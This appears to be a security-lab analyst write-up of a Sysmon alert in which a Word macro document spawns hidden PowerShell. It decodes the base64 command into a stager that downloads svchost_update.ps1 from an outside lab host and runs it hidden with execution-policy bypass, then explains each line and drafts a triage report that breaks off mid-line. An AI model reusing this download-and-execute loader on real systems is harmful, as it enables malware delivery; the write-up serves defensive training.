# Alert 2

- id: 6353

- alert Rule: Suspicious child process spawned

- Severity: <span style="color: orange;">High</span>   

- Type: Execution

- Date: Oct 26rd 2026 at 02:05

Description:

This detection fires when a user-facing desktop application spawns a child process. Modern office applications legitimately launch helper components, including local machine-learning and assistance features, so a match is not conclusive on its own. Where the child is a script interpreter, particularly one launched with an encoded command or with its window and execution policy suppressed, the activity warrants closer scrutiny. The analyst must inspect the path, publisher, and command line of the spawned binary, recover any concealed instructions, and determine whether code from outside the organisation has run.

CommandLine:

powershell.exe -NoP -W Hidden -Enc JABzAHQAYQBnAGUAcgAgAD0AIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAcwB2AGMAaABvAHMAdABfAHUAcABkAGEAdABlAC4AcABzADEAIgANAAoAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAnAGgAdAB0AHAAOgAvAC8AcABhAHkAbABpAG4AawAtAGMAZABuAC4AdABoAG0AOgA4ADAANgA3AC8AcwB2AGMAaABvAHMAdABfAHUAcABkAGEAdABlAC4AcABzADEAJwAsACAAJABzAHQAYQBnAGUAcgApAA0ACgBTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBBAHIAZwB1AG0AZQBuAHQATABpAHMAdAAgACIALQBOAG8AUAAgAC0AVwAgAEgAaQBkAGQAZQBuACAALQBFAHgAZQBjAHUAdABpAG8AbgBQAG8AbABpAGMAeQAgAEIAeQBwAGEAcwBzACAALQBGAGkAbABlACAAYAAiACQAcwB0AGEAZwBlAHIAYAAiACIAIAAtAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQAgAEgAaQBkAGQAZQBuAA==

Company:

Microsoft Corporation

CurrentDirectory:

C:\Windows\system32\

Description:

Windows PowerShell

EventCode:

1

EventType:

4

FileVersion:

10.0.22621.1635 (WinBuild.160101.0800)

Hashes:

MD5=B94110F627D2BA6C57EB84A0F9575B27,SHA256=B7327B511CBADC9C471F5AA7438E47FFEC3430145C8D23E0E3256183295CA974,IMPHASH=C5E22AE5B5F7F22DF3A5C34E34002F28

Image:

C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe

IntegrityLevel:

Medium

LogName:

Microsoft-Windows-Sysmon/Operational

LogonGuid:

{3af46175-c39c-6a8f-e030-9c0000000000}

LogonId:

0x9C30E0

OpCode:

Info

OriginalFileName:

PowerShell.EXE

ParentCommandLine:

"C:\Program Files (x86)\Microsoft Office\Root\Office16\WINWORD.EXE" /n "C:\Users\m.smith\Downloads\Q3_PressKit_Feedback.docm" /o ""

ParentImage:

C:\Program Files (x86)\Microsoft Office\root\Office16\WINWORD.EXE

ParentProcessGuid:

{3af46175-3906-6a90-921d-000000001200}

ParentProcessId:

6184

ParentUser:

TRYHATME\m.smith

ProcessGuid:

{3af46175-3907-6a90-951d-000000001200}

ProcessId:

8572

Product:

Microsoft® Windows® Operating System

Sid:

S-1-5-18

SidType:

0

SourceName:

Microsoft-Windows-Sysmon

TaskCategory:

Process Create (rule: ProcessCreate)

TerminalSessionId:

4

Type:

Information

User:

[ "NOT_TRANSLATED", "TRYHATME\\m.smith" ]

category:

Process Create (rule: ProcessCreate)

event_id:

46148

host:

THM-MSMITH.tryhatmestudios.thm

timestamp:

10/26/2026 02:03:38.547

datasource:

WinEventLog:Microsoft-Windows-Sysmon/Operational

Here we have the same thing as the previous alert but here we have a payload executed by `powershell.exe`


Here we have more context, the previous **.docm** downloaded and opened by word now executes this thing . It is encoded in base64 so using [Cyberchef](https://gchq.github.io/CyberChef/) if decoded it in normal code.

```powershell
$stager = "$env:TEMP\svchost_update.ps1"

(New-Object Net.WebClient).DownloadFile('http://paylink-cdn.thm:8067/svchost_update.ps1', $stager)

$stager = "$env:TEMP\svchost_update.ps1"

(New-Object Net.WebClient).DownloadFile('http://paylink-cdn.thm:8067/svchost_update.ps1', $stager)

Start-Process powershell.exe -ArgumentList "-NoP -W Hidden -ExecutionPolicy Bypass -File `"$stager`"" -WindowStyle Hidden
```
See also [alert-2.ps1](./alert-2.ps1)

This code executed in background, with no profile and bypassing Execution policy downloads and executes a remote PowerShell script while attempting to keep the activity hidden. These are common techniques used in malware loaders and hands-on security labs.

## Line-by-line breakdown

1. Define the staging path


```powershell
$stager = "$env:TEMP\svchost_update.ps1"
```

- Stores the path to a file named `svchost_update.ps1` in the current user's temporary directory.
- `$env:TEMP` resolves to the user's temporary folder.

2. Download the remote script

```powershell
(New-Object Net.WebClient).DownloadFile(
    'http://paylink-cdn.thm:8067/svchost_update.ps1',
    $stager
)
```

- Creates a .NET `WebClient` object.
- Downloads the file over HTTP from the specified host and port.
- Saves it to the path stored in `$stager`.
- Because it uses HTTP rather than HTTPS, the transfer does not provide TLS encryption.

3. Launch the downloaded script

```powershell
Start-Process powershell.exe -ArgumentList "-NoP -W Hidden -ExecutionPolicy Bypass -File `"$stager`"" -WindowStyle Hidden
```

- `Start-Process`: launches another process.
- `-NoP`: shorthand for `-NoProfile`.
- `-W Hidden`: requests a hidden PowerShell window.
- `-ExecutionPolicy Bypass`: bypasses PowerShell's execution-policy restrictions for that process; it does not disable every security control.
- `-File`: specifies the downloaded script to execute.
- The backticks escape quotation marks around the script path within the argument string.

## Why this command is suspicious

| Indicator | Significance |
| --- | --- |
| Remote script download | Retrieves executable content from an external host |
| HTTP connection | Content can potentially be intercepted or modified in transit |
| `svchost_update.ps1` filename | Resembles a legitimate Windows process name, potentially to disguise the file |
| Hidden execution | Reduces the visibility of the PowerShell window |
| Execution-policy bypass | Avoids the normal PowerShell execution-policy check |

These behaviors are suspicious, but the snippet alone does not prove that the downloaded script is malicious. Its actual behavior depends on the contents of `svchost_update.ps1`.

## Report

```
Time of activity: 10/26/2026 02:03:38.547

List of Affected Entities:  THM-MSMITH.tryhatmestudios.thm host

Reason for Classifying as True Positive: A downloaded Q3_PressKit_Feedback.docm executes an encoded code to download from http://paylink-cdn.thm:8067/svchost_update.ps1 and executes it.

Reason for Escalating the Alert: The downloaded file could be harmless therefore as the protocol is http, looking at the content from network analysis could decided whether this is legitimate or not.

Recommended Remediation Actions: Find content of svchost_update.ps1 and if it was executed .

List of Attack Indicators: Q3_PressKit_Feedback.docm ,http://paylink-
```